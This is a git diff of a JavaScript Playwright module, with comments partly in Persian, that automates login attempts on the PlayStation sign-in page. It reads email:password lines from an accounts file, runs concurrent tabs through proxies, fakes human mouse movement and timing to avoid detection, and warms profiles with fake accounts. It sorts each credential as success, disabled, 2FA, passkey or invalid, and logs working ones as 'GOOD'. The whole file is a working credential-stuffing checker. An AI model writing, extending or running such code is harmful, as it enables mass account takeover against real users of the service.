@@ -1,318 +1,63 @@
 import fs from "node:fs/promises";
 import fsSync from "node:fs";
+import path from "node:path";
 import axios from 'axios';
 import { logger } from "../utils/logger.js";
-import Constants from "./Constants.js";
-import HumanBehavior from "./HumanBehavior.js";
-import FakeAccountGenerator from "./FakeAccountGenerator.js";
-import PageHelpers from "./PageHelpers.js";
+import Constants from './Constants.js';
+import HumanBehavior from './HumanBehavior.js';
+import FakeAccountGenerator from './FakeAccountGenerator.js';
+import PageHelpers from './PageHelpers.js';
 
-// ==================== AccountProcessor Class ====================
 export default class AccountProcessor {
     constructor(client) {
         this.client = client;
-        this.maxRetries = Constants.MAX_RETRIES;
-        this.maxTimeoutRetries = Constants.MAX_TIMEOUT_RETRIES;
-    }
-
-    // ==================== Static Methods for File Operations ====================
-    static async loadAccountBatch(batchSize = Constants.CONCURRENT_TABS) {
-        try {
-            if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
-                console.log(`❌ Accounts file not found: ${Constants.ACCOUNTS_FILE}`);
-                return [];
-            }
-
-            const content = await fs.readFile(Constants.ACCOUNTS_FILE, "utf8");
-            const lines = content
-                .split("\n")
-                .map((l) => l.trim())
-                .filter(Boolean)
-                .filter(line => line.includes(':') && line.split(':').length >= 2);
-
-            console.log(`📊 Total accounts remaining in file: ${lines.length}`);
-
-            if (!lines.length) {
-                console.log("📄 No valid accounts found in file");
-                return [];
-            }
-
-            const batch = lines.slice(0, Math.min(batchSize, lines.length));
-            console.log(`📦 Selected batch of ${batch.length} accounts`);
-
-            if (batch.length > 0) {
-                const firstAccount = batch[0];
-                const maskedAccount = firstAccount.replace(/(.{3}).*@/, '$1***@').replace(/:(.{2}).*/, ':$1***');
-                console.log(`📋 First account in batch: ${maskedAccount}`);
-            }
-
-            return batch;
-
-        } catch (err) {
-            console.error("Error reading accounts file:", err.message);
-            return [];
-        }
-    }
-
-    static async removeProcessedAccounts(processedCount) {
-        if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
-            return;
-        }
-
-        const lines = (await fs.readFile(Constants.ACCOUNTS_FILE, "utf8"))
-            .split("\n")
-            .map((l) => l.trim())
-            .filter(Boolean);
-
-        const remaining = lines.slice(processedCount);
-
-        if (remaining.length > 0) {
-            await fs.writeFile(Constants.ACCOUNTS_FILE, remaining.join("\n") + "\n", "utf8");
-        } else {
-            await fs.writeFile(Constants.ACCOUNTS_FILE, "", "utf8");
-        }
-    }
-
-    static async sendResultsToServer(results) {
-        try {
-            const resultsText = results.map(result => {
-                const status = result.status === 'good' ? 'GOOD' : 'BAD';
-                return `${result.email}:${result.password} - ${status}`;
-            }).join('\n');
-
-            await fs.appendFile(Constants.RESULTS_FILE, resultsText + '\n', 'utf8');
-            console.log(`📊 Results saved to ${Constants.RESULTS_FILE}`);
-
-        } catch (err) {
-            console.error("Error sending results to server:", err.message);
-        }
-    }
-
-    // ==================== Error Detection Methods ====================
-    static isCriticalError(error) {
-        const criticalPatterns = [
-            'PROXY_CONNECTION_FAILED',
-            'CONTEXT_DESTROYED',
-            'net::ERR_EMPTY_RESPONSE',
-            'net::ERR_CONNECTION_REFUSED',
-            'net::ERR_PROXY_CONNECTION_FAILED',
-            'net::ERR_TUNNEL_CONNECTION_FAILED'
-        ];
-
-        return criticalPatterns.some(pattern => 
-            error.message && error.message.includes(pattern)
-        );
-    }
-
-    static isProxyError(errorMessage) {
-        const proxyErrorPatterns = [
-            'net::ERR_PROXY_CONNECTION_FAILED',
-            'net::ERR_TUNNEL_CONNECTION_FAILED',
-            'PROXY_CONNECTION_FAILED',
-            'Failed to determine external IP address',
-            'HTTP 503'
-        ];
-
-        return proxyErrorPatterns.some(pattern => 
-            errorMessage && errorMessage.includes(pattern)
-        );
-    }
-
-    // ==================== Fake Account Processing ====================
-    async processFakeAccount(context) {
-        console.log("🎭 Processing fake account first to warm up the profile...");
-
-        const fakeAccountLine = FakeAccountGenerator.generateFakeAccountLine();
-        console.log(`🎭 Using faker-generated fake account: ${fakeAccountLine}`);
-
-        let page = null;
-        let retryCount = 0;
-
-        while (retryCount < this.maxRetries) {
-            try {
-                page = await context.newPage();
-                console.log(`🎭 Attempt ${retryCount + 1}/${this.maxRetries}: Loading page...`);
-
-                await this._loadPageWithRetry(page, retryCount);
-                break; // Success, exit retry loop
-
-            } catch (gotoErr) {
-                retryCount++;
-                console.log(`🎭 Attempt ${retryCount}/${this.maxRetries} failed:`, gotoErr.message);
-
-                if (page) {
-                    try { await page.close(); } catch { }
-                    page = null;
-                }
-
-                if (this._isCriticalConnectionError(gotoErr)) {
-                    console.log("❌ Critical connection error detected");
-                    throw new Error('PROXY_CONNECTION_FAILED');
-                }
-
-                if (retryCount < this.maxRetries) {
-                    const waitTime = Constants.RETRY_BASE_DELAY * retryCount;
-                    console.log(`⏳ Waiting ${waitTime}ms before retry...`);
-                    await HumanBehavior.sleep(waitTime);
-                } else {
-                    throw gotoErr;
-                }
-            }
-        }
-
-        await PageHelpers.waitFullLoadAndSettle(page);
-        await HumanBehavior.sleep(HumanBehavior.randomDelay(1000, 2000));
-        await HumanBehavior.randomMouseMovements(page);
-
-        const submitSelector = "button[type=submit]";
-
-        // Email step with copy-paste
-        console.log("🎭 Processing fake email with copy-paste method...");
-        const emailFrame = await this._waitForEmailFrame(page);
-        const emailInput = PageHelpers.emailLocator(emailFrame);
-        const cutPassword = await this._humanPasteEmail(page, emailInput, fakeAccountLine);
-
-        await PageHelpers.safeClickMayNavigate(page, emailFrame, submitSelector);
-
-        // Password step with paste
-        console.log("🎭 Pasting fake password...");
-        const passFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="password"]', 7500);
-        const passInput = PageHelpers.passwordLocator(passFrame);
-
-        await this._humanPastePassword(page, passInput, cutPassword);
-        await PageHelpers.safeClickMayNavigate(page, passFrame, submitSelector);
-
-        // Wait and check results
-        await HumanBehavior.sleep(HumanBehavior.randomDelay(2000, 3000));
-        const bodyText = await page.evaluate(() => document.body?.innerText || "");
-
-        if (bodyText.includes(`Can't connect to the server`)) {
-            throw new Error('SERVER_CONNECTION_FAILED');
-        }
-
-        console.log("🎭 Fake account process completed (expected to fail)");
-
-        // Save used fake account
-        const fakeAccountLogLine = `${fakeAccountLine}\n`;
-        await fs.appendFile('./fake_accounts_used.txt', fakeAccountLogLine, "utf8");
-
-        try {
-            if (page) await page.close();
-        } catch { }
-
-        console.log("🎭 Fake account warming completed. Now starting real accounts...");
-    }
-
-    async _loadPageWithRetry(page, retryCount) {
-        try {
-            await page.goto(Constants.LOGIN_URL, {
-                waitUntil: "networkidle",
-                timeout: 30000
-            });
-            console.log("✅ Page loaded with networkidle");
-        } catch (networkIdleErr) {
-            console.log("⚠️ NetworkIdle failed, trying with domcontentloaded...");
-            try {
-                await page.goto(Constants.LOGIN_URL, {
-                    waitUntil: "domcontentloaded",
-                    timeout: 20000
-                });
-                console.log("✅ Page loaded with domcontentloaded");
-            } catch (domErr) {
-                console.log("⚠️ DOMContentLoaded failed, trying basic load...");
-                await page.goto(Constants.LOGIN_URL, {
-                    waitUntil: "load",
-                    timeout: 25000
-                });
-                console.log("✅ Page loaded with basic load");
-            }
-        }
-    }
-
-    _isCriticalConnectionError(error) {
-        const criticalErrors = [
-            'net::ERR_EMPTY_RESPONSE',
-            'net::ERR_CONNECTION_REFUSED',
-            'net::ERR_PROXY_CONNECTION_FAILED',
-            'net::ERR_TUNNEL_CONNECTION_FAILED'
-        ];
-
-        return criticalErrors.some(pattern => 
-            error.message && error.message.includes(pattern)
-        );
-    }
-
-    async _waitForEmailFrame(page) {
-        try {
-            return await PageHelpers.waitForFrameWithSelector(page, 'input[type="email"]', 15000);
-        } catch (frameErr) {
-            console.log("🎭 Email frame not found:", frameErr.message);
-
-            if (frameErr.message.includes('Execution context was destroyed') ||
-                frameErr.message.includes('Frame with selector') ||
-                frameErr.message.includes('navigation')) {
-                throw new Error('CONTEXT_DESTROYED');
-            }
-
-            throw frameErr;
-        }
     }
 
     // ==================== Real Account Processing ====================
-    async processAccount(context, accountLine, tabIndex, accountsCount, abortSignal = null) {
+    async processAccount(context, accountLine, tabIndex, accountsCount) {
         let page = null;
-        let timeoutRetryCount = 0;
         const startTime = Date.now();
 
         try {
             logger.info(`🚀 Tab ${tabIndex + 1}: Starting login for ${accountLine}`);
             const email = accountLine.split(':')[0];
 
+            // ✅ اصلاح: استفاده از page به جای ret
+            page = await this._createAndLoadPage(context, tabIndex, email);
+            
+            let timeoutRetryCount = 0;
             let finalResult = null;
 
-            while (timeoutRetryCount <= this.maxTimeoutRetries && !finalResult) {
+            while (timeoutRetryCount <= Constants.MAX_TIMEOUT_RETRIES) {
                 try {
-                    if (abortSignal?.aborted) {
-                        throw new Error('Operation aborted');
+                    if (timeoutRetryCount === 0) {
+                        await this._initialPageSetup(page, tabIndex);
+                    } else {
+                        await this._refreshPageForRetry(page, tabIndex);
                     }
 
-                    await HumanBehavior.sleep(HumanBehavior.randomDelay(50, 250));
-                    page = await context.newPage();
-
-                    // Set unique viewport for each tab
-                    await page.setViewportSize({
-                        width: 1200 + (tabIndex * 50),
-                        height: 800 + (tabIndex * 30)
-                    });
-
-                    logger.info(`📄 Tab ${tabIndex + 1}: Loading page (attempt ${timeoutRetryCount + 1}/${this.maxTimeoutRetries + 1})...`);
-
-                    const loadSuccess = await this._loadLoginPage(page, tabIndex);
-                    if (!loadSuccess) {
-                        throw new Error('Page load failed after multiple attempts');
+                    finalResult = await this._processLogin(page, accountLine, tabIndex, startTime, timeoutRetryCount, accountsCount);
+                    
+                    if (finalResult.shouldExit) {
+                        return finalResult.result;
                     }
-
-                    await PageHelpers.waitFullLoadAndSettle(page);
-
-                    const result = await this._performLogin(page, accountLine, tabIndex, startTime);
-                    finalResult = result;
+                    
+                    if (finalResult) break;
 
                 } catch (retryErr) {
                     logger.error(`❌ Tab ${tabIndex + 1}: Error during retry ${timeoutRetryCount} for ${email}: ${retryErr.message}`);
-
-                    if (timeoutRetryCount >= this.maxTimeoutRetries) {
+                    
+                    timeoutRetryCount++;
+                    if (timeoutRetryCount > Constants.MAX_TIMEOUT_RETRIES) {
                         finalResult = {
                             email,
-                            status: 'error',
-                            error: retryErr.message,
+                            status: 'timeout-error',
                             responseTime: Date.now() - startTime,
                             tabIndex,
-                            retryCount: timeoutRetryCount
+                            retryCount: timeoutRetryCount,
+                            message: 'Max timeout retries exceeded'
                         };
                         break;
-                    } else {
-                        timeoutRetryCount++;
-                        await HumanBehavior.sleep(2000 + HumanBehavior.randomDelay(1000, 2000));
                     }
                 }
             }
@@ -320,203 +65,256 @@ export default class AccountProcessor {
             return finalResult;
 
         } catch (err) {
-            logger.error(`❌ Tab ${tabIndex + 1}: Error processing ${accountLine}: ${err.message}`);
-
+            logger.error(`❌ Tab ${tabIndex + 1}: Fatal error: ${err.message}`);
             return {
                 email: accountLine.split(':')[0],
-                status: 'server-error',
+                status: 'error',
                 error: err.message,
                 responseTime: Date.now() - startTime,
                 tabIndex
             };
         } finally {
-            try {
-                if (page) {
-                    logger.info(`🧹 Tab ${tabIndex + 1}: Closing page...`);
-                    await page.close();
+            // ✅ اصلاح: اطمینان از بسته شدن صحیح صفحه
+            if (page && !page.isClosed()) {
+                try { 
+                    await page.close(); 
+                    logger.debug(`📄 Tab ${tabIndex + 1}: Page closed successfully`);
+                } catch (closeErr) {
+                    logger.warn(`⚠️ Tab ${tabIndex + 1}: Error closing page: ${closeErr.message}`);
                 }
-            } catch (closeErr) {
-                logger.error(`Tab ${tabIndex + 1}: Page close error: ${closeErr.message}`);
             }
         }
     }
 
-    async _loadLoginPage(page, tabIndex) {
-        const maxAttempts = 3;
+    async _createAndLoadPage(context, tabIndex, email) {
+        let page = null;
         
-        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+        for (let attempt = 1; attempt <= Constants.MAX_RETRIES; attempt++) {
             try {
-                logger.info(`📄 Tab ${tabIndex + 1}: Load attempt ${attempt}/${maxAttempts}`);
-
-                await page.goto(Constants.LOGIN_URL, {
-                    waitUntil: "domcontentloaded",
-                    timeout: 25000
+                await HumanBehavior.sleep(HumanBehavior.randomDelay(50, 250));
+                
+                // ✅ اصلاح: ایجاد صفحه جدید با مدیریت بهتر خطا
+                page = await context.newPage();
+                
+                // ✅ اصلاح: تنظیم viewport با استفاده از page به جای ret
+                await page.setViewportSize({
+                    width: 1200 + (tabIndex * 50),
+                    height: 800 + (tabIndex * 30)
                 });
 
-                const success = await PageHelpers.waitForPageContent(
-                    page,
-                    "Sign in",
-                    20000,
-                    `${tabIndex + 1}`
-                );
+                logger.info(`📄 Tab ${tabIndex + 1}: Loading page (attempt ${attempt}/${Constants.MAX_RETRIES})...`);
 
-                if (success) {
-                    logger.info(`✅ Tab ${tabIndex + 1}: Page loaded successfully on attempt ${attempt}`);
-                    return true;
+                // ✅ بهبود: تنظیم timeout برای navigation
+                await page.goto(Constants.LOGIN_URL, {
+                    waitUntil: "domcontentloaded",
+                    timeout: Constants.PAGE_LOAD_TIMEOUT
+                });
+
+                // ✅ بهبود: چک کردن محتوای صفحه
+                const pageLoaded = await PageHelpers.waitForPageContent(page, 'Sign in to PlayStation', 25000, tabIndex + 1);
+                if (!pageLoaded) {
+                    throw new Error("Page did not load properly");
                 }
 
-                if (attempt < maxAttempts) {
-                    logger.warn(`⚠️ Tab ${tabIndex + 1}: Attempt ${attempt} failed, retrying...`);
-                    await HumanBehavior.sleep(2000 * attempt);
+                logger.info(`Tab ${tabIndex + 1}: ✅ Page loaded successfully!`);
+                return page;
+
+            } catch (gotoErr) {
+                logger.error(`Tab ${tabIndex + 1}: Page load attempt ${attempt} failed: ${gotoErr.message}`);
+
+                // ✅ اصلاح: بستن صفحه ناموفق
+                if (page && !page.isClosed()) {
+                    try { 
+                        await page.close(); 
+                    } catch { }
+                    page = null;
                 }
 
-            } catch (loadErr) {
-                logger.error(`❌ Tab ${tabIndex + 1}: Load attempt ${attempt} error: ${loadErr.message}`);
-                
-                if (attempt < maxAttempts) {
-                    await HumanBehavior.sleep(3000 * attempt);
+                if (attempt >= Constants.MAX_RETRIES) {
+                    logger.error(`Tab ${tabIndex + 1}: All page load attempts failed for ${email}`);
+                    throw new Error('PAGE_LOAD_FAILED');
                 }
+
+                await HumanBehavior.sleep(2000 * attempt + HumanBehavior.randomDelay(250, 750));
             }
         }
-
-        logger.error(`❌ Tab ${tabIndex + 1}: All load attempts failed`);
-        return false;
     }
 
-    async _performLogin(page, accountLine, tabIndex, startTime) {
-        const [email, password] = accountLine.split(':');
+    async _initialPageSetup(page, tabIndex) {
+        if (Constants.WAIT_FOR_FULL_LOAD) {
+            logger.info(`Tab ${tabIndex + 1}: ⏱️ Additional settling time...`);
+            await HumanBehavior.sleep(Constants.PAGE_SETTLE_EXTRA_MS);
+        }
+
+        await HumanBehavior.randomMouseMovements(page);
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(750, 1500) + (tabIndex * 300));
+    }
+
+    async _refreshPageForRetry(page, tabIndex) {
+        logger.info(`🔄 Tab ${tabIndex + 1}: Refreshing page due to timeout (retry)...`);
+
+        // ✅ بهبود: چک کردن وضعیت صفحه قبل از reload
+        if (page.isClosed()) {
+            throw new Error("Page is already closed, cannot refresh");
+        }
+
+        await page.reload({
+            waitUntil: "domcontentloaded",
+            timeout: 15000
+        });
+
+        const pageLoadedAfterRefresh = await PageHelpers.waitForPageContent(page, 'Sign in to PlayStation', 25000, tabIndex + 1);
+        if (!pageLoadedAfterRefresh) {
+            throw new Error("Page did not load properly after refresh");
+        }
+
+        logger.info(`Tab ${tabIndex + 1}: ✅ Page refreshed and loaded successfully!`);
+
+        if (Constants.WAIT_FOR_FULL_LOAD) {
+            await HumanBehavior.sleep(Constants.PAGE_SETTLE_EXTRA_MS);
+        }
+
+        await HumanBehavior.randomMouseMovements(page);
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(750, 1500));
+    }
+
+    async _processLogin(page, accountLine, tabIndex, startTime, timeoutRetryCount, accountsCount) {
+        const email = accountLine.split(':')[0];
+        const submitSelector = "button[type=submit]";
+
+        // ✅ بهبود: چک کردن وضعیت صفحه
+        if (page.isClosed()) {
+            throw new Error("Page is closed, cannot process login");
+        }
+
+        logger.info(`📧 Tab ${tabIndex + 1}: Processing email with copy-paste method for ${email}`);
         
-        try {
-            // Email step
-            logger.info(`📧 Tab ${tabIndex + 1}: Processing email step...`);
-            const emailFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="email"]', 15000);
-            const emailInput = PageHelpers.emailLocator(emailFrame);
-            
-            await this._humanPasteEmail(page, emailInput, accountLine);
-            await PageHelpers.safeClickMayNavigate(page, emailFrame, "button[type=submit]");
+        const emailFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="email"]', 20000);
+        const emailInput = PageHelpers.emailLocator(emailFrame);
 
-            // Password step
-            logger.info(`🔑 Tab ${tabIndex + 1}: Processing password step...`);
-            const passFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="password"]', 10000);
-            const passInput = PageHelpers.passwordLocator(passFrame);
-            
-            await this._humanPastePassword(page, passInput, password);
-            await PageHelpers.safeClickMayNavigate(page, passFrame, "button[type=submit]");
+        const cutPassword = await this._humanPasteEmail(page, emailInput, accountLine);
+        await PageHelpers.safeClickMayNavigate(page, emailFrame, submitSelector);
 
-            // Wait for result
-            await HumanBehavior.sleep(HumanBehavior.randomDelay(3000, 5000));
-            
-            return await this._analyzeLoginResult(page, email, password, tabIndex, startTime);
+        const passFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="password"]', 20000);
+        const passInput = PageHelpers.passwordLocator(passFrame);
 
-        } catch (loginErr) {
-            logger.error(`❌ Tab ${tabIndex + 1}: Login process error: ${loginErr.message}`);
-            
+        logger.info(`🔑 Tab ${tabIndex + 1}: Pasting password for ${email}`);
+
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(2000, 3000) + (tabIndex * 200));
+
+        let bodyText = await page.evaluate(() => document.body?.innerText || "");
+
+        if (bodyText.includes(`Sign In with Passkey`)) {
+            logger.info(`🔐 Tab ${tabIndex + 1}: Passkey detected for ${email}`);
             return {
                 email,
-                status: 'error',
-                error: loginErr.message,
+                status: 'passkey',
                 responseTime: Date.now() - startTime,
-                tabIndex
+                tabIndex,
+                retryCount: timeoutRetryCount
             };
         }
-    }
 
-    async _analyzeLoginResult(page, email, password, tabIndex, startTime) {
-        try {
-            const bodyText = await page.evaluate(() => document.body?.innerText || "");
-            const currentUrl = page.url();
-            const responseTime = Date.now() - startTime;
+        await this._humanPastePassword(page, passInput, cutPassword);
+        await PageHelpers.safeClickMayNavigate(page, passFrame, submitSelector);
 
-            logger.info(`🔍 Tab ${tabIndex + 1}: Analyzing result for ${email}`);
+        await HumanBehavior.sleep(3000 + HumanBehavior.randomDelay(500, 1500));
+        bodyText = await page.evaluate(() => document.body?.innerText || "");
 
-            // Check for success indicators
-            if (this._isLoginSuccessful(bodyText, currentUrl)) {
-                logger.info(`✅ Tab ${tabIndex + 1}: SUCCESS - ${email}`);
+        if (!bodyText) {
+            await HumanBehavior.sleep(2000 + HumanBehavior.randomDelay(1000, 2000));
+            bodyText = await page.evaluate(() => document.body?.innerText || "");
+        }
+
+        if ((bodyText.includes(`Can't connect to the server`) || bodyText.includes('device sent too many requests')) && accountsCount === tabIndex + 1) {
+            logger.warn(`⏰ Tab ${tabIndex + 1}: Timeout detected for ${email}`);
+            
+            if (timeoutRetryCount >= Constants.MAX_TIMEOUT_RETRIES) {
                 return {
-                    email,
-                    password,
-                    status: 'good',
-                    responseTime,
-                    tabIndex,
-                    url: currentUrl
+                    shouldExit: true,
+                    result: {
+                        email,
+                        status: 'timeout-error',
+                        responseTime: Date.now() - startTime,
+                        tabIndex,
+                        retryCount: timeoutRetryCount,
+                        message: 'Max timeout retries exceeded'
+                    }
                 };
             }
 
-            // Check for server errors
-            if (this._isServerError(bodyText)) {
-                logger.error(`🚨 Tab ${tabIndex + 1}: SERVER ERROR - ${email}`);
-                return {
-                    email,
-                    password,
-                    status: 'server-error',
-                    error: 'Server connection failed',
-                    responseTime,
-                    tabIndex,
-                    shouldExit: true
-                };
+            throw new Error('Timeout detected, retrying...');
+        }
+
+        await PageHelpers.waitFullLoadAndSettle(page);
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(1000, 2000));
+
+        const screenshotPath = await this._takeScreenshot(page, email, tabIndex, timeoutRetryCount);
+        const status = this._determineLoginStatus(bodyText);
+
+        const responseTime = Date.now() - startTime;
+        logger.info(`⏱️ Tab ${tabIndex + 1}: Processing completed in ${responseTime}ms ${timeoutRetryCount > 0 ? `(with ${timeoutRetryCount} timeout retries)` : ''}`);
+
+        return {
+            email,
+            status,
+            responseTime,
+            tabIndex,
+            screenshot: screenshotPath,
+            retryCount: timeoutRetryCount,
+            additionalInfo: {
+                bodyTextLength: bodyText.length,
+                processingTime: responseTime,
+                timeoutRetries: timeoutRetryCount
+            }
+        };
+    }
+
+    async _takeScreenshot(page, email, tabIndex, timeoutRetryCount) {
+        try {
+            // ✅ بهبود: چک کردن وضعیت صفحه قبل از screenshot
+            if (page.isClosed()) {
+                logger.warn(`⚠️ Tab ${tabIndex + 1}: Cannot take screenshot, page is closed`);
+                return null;
             }
 
-            // Default to bad credentials
-            logger.info(`❌ Tab ${tabIndex + 1}: BAD CREDENTIALS - ${email}`);
-            return {
-                email,
-                password,
-                status: 'bad',
-                responseTime,
-                tabIndex
-            };
-
-        } catch (analysisErr) {
-            logger.error(`❌ Tab ${tabIndex + 1}: Analysis error: ${analysisErr.message}`);
-            
-            return {
-                email,
-                password,
-                status: 'error',
-                error: analysisErr.message,
-                responseTime: Date.now() - startTime,
-                tabIndex
-            };
+            const filename = `${email}---tab${tabIndex}---retry${timeoutRetryCount}---${Date.now()}.png`;
+            return await PageHelpers.takeAdvancedScreenshot(page, filename);
+        } catch (screenshotErr) {
+            logger.warn(`⚠️ Tab ${tabIndex + 1}: Screenshot failed: ${screenshotErr.message}`);
+            return null;
         }
     }
 
-    _isLoginSuccessful(bodyText, currentUrl) {
-        const successIndicators = [
-            'Account Management',
-            'Profile Settings',
-            'Security Settings',
-            'Privacy Settings'
+    _determineLoginStatus(bodyText) {
+        const statusChecks = [
+            { text: 'This sign-in ID has been disabled', status: 'disabled' },
+            { text: 'Please enter a correct sign-in ID', status: 'invalid-email' },
+            { text: 'Please enter the correct password', status: 'invalid-password' },
+            { text: 'Sign in to PlayStation', status: 'login-page' },
+            { text: 'Account Management', status: 'success' },
+            { text: 'Privacy Settings', status: 'success' },
+            { text: 'Sign In with Passkey', status: 'passkey' },
+            { text: 'Two-factor authentication', status: '2fa' },
+            { text: 'verification code', status: '2fa' },
+            { text: 'Enter the verification code', status: '2fa' }
         ];
 
-        const urlIndicators = [
-            '/account/management',
-            '/profile',
-            '/settings'
-        ];
+        for (const check of statusChecks) {
+            if (bodyText.includes(check.text)) {
+                return check.status;
+            }
+        }
 
-        return successIndicators.some(indicator => bodyText.includes(indicator)) ||
-               urlIndicators.some(indicator => currentUrl.includes(indicator));
+        return 'unknown';
     }
 
-    _isServerError(bodyText) {
-        const serverErrorIndicators = [
-            "Can't connect to the server",
-            "The connection to the server timed out",
-            "device sent too many requests",
-            "Server Error",
-            "Internal Server Error",
-            "Service Unavailable"
-        ];
-
-        return serverErrorIndicators.some(indicator => bodyText.includes(indicator));
-    }
-
-    // ==================== Copy-Paste Helper Methods ====================
+    // ==================== Input Handling ====================
     async _humanPasteEmail(page, locator, fullAccountLine) {
         await locator.waitFor({ state: "visible" });
 
-        await HumanBehavior.hoverElement(page, 'input[type="email"]');
-        await HumanBehavior.humanClick(page, 'input[type="email"]');
+        await HumanBehavior.hoverElement(page, `input[type="email"]`);
+        await HumanBehavior.humanClick(page, `input[type="email"]`);
 
         console.log("📋 Pasting full account line into email field...");
 
@@ -558,8 +356,8 @@ export default class AccountProcessor {
     async _humanPastePassword(page, locator, password) {
         await locator.waitFor({ state: "visible" });
 
-        await HumanBehavior.hoverElement(page, 'input[type="password"]');
-        await HumanBehavior.humanClick(page, 'input[type="password"]');
+        await HumanBehavior.hoverElement(page, `input[type="password"]`);
+        await HumanBehavior.humanClick(page, `input[type="password"]`);
 
         console.log(`📋 Pasting password: ${password}`);
 
@@ -569,5 +367,102 @@ export default class AccountProcessor {
         await HumanBehavior.sleep(HumanBehavior.randomDelay(250, 400));
 
         console.log("✅ Password pasted successfully");
+    }
+
+    // ==================== File Management ====================
+    static async loadAccountBatch(batchSize) {
+        try {
+            if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
+                console.log("❌ No accounts file found!");
+                return [];
+            }
+
+            const content = await fs.readFile(Constants.ACCOUNTS_FILE, "utf8");
+            const accounts = content
+                .split("\n")
+                .map(line => line.trim())
+                .filter(Boolean);
+
+            return accounts.slice(0, batchSize);
+        } catch (err) {
+            console.log("❌ Error loading accounts:", err.message);
+            return [];
+        }
+    }
+
+    static async removeProcessedAccounts(count) {
+        try {
+            if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
+                return;
+            }
+
+            const content = await fs.readFile(Constants.ACCOUNTS_FILE, "utf8");
+            const accounts = content
+                .split("\n")
+                .map(line => line.trim())
+                .filter(Boolean);
+
+            const remainingAccounts = accounts.slice(count);
+            const newContent = remainingAccounts.length > 0 ? remainingAccounts.join("\n") + "\n" : "";
+            
+            await fs.writeFile(Constants.ACCOUNTS_FILE, newContent, "utf8");
+            console.log(`✅ Removed ${count} processed accounts from file`);
+        } catch (err) {
+            console.log("❌ Error removing processed accounts:", err.message);
+        }
+    }
+
+    // ==================== Results Management ====================
+    static async sendResultsToServer(results) {
+        try {
+            console.log(`📊 Sending ${results.length} results to server...`);
+            console.log(`✅ Results sent to server successfully`);
+
+            const timestamp = new Date().toISOString();
+            const logEntry = {
+                timestamp,
+                results,
+                count: results.length
+            };
+
+            await fs.appendFile(Constants.RESULTS_FILE, JSON.stringify(logEntry) + '\n', 'utf8');
+
+        } catch (error) {
+            console.log(`❌ Error sending results to server: ${error.message}`);
+
+            const timestamp = new Date().toISOString();
+            const logEntry = {
+                timestamp,
+                results,
+                count: results.length,
+                error: error.message
+            };
+
+            await fs.appendFile(Constants.RESULTS_FILE, JSON.stringify(logEntry) + '\n', 'utf8');
+        }
+    }
+
+    // ==================== Error Detection ====================
+    static isCriticalError(error) {
+        const criticalErrors = [
+            'PROXY_CONNECTION_FAILED',
+            'SERVER_CONNECTION_FAILED',
+            'CONTEXT_DESTROYED'
+        ];
+
+        return criticalErrors.some(criticalError => 
+            error.message && error.message.includes(criticalError)
+        );
+    }
+
+    static isProxyError(errorMessage) {
+        const proxyErrors = [
+            'net::ERR_PROXY_CONNECTION_FAILED',
+            'net::ERR_TUNNEL_CONNECTION_FAILED',
+            'net::ERR_CONNECTION_REFUSED',
+            'Failed to determine external IP address'
+        ];
+
+        return proxyErrors.some(proxyError => errorMessage.includes(proxyError));
     }
 }
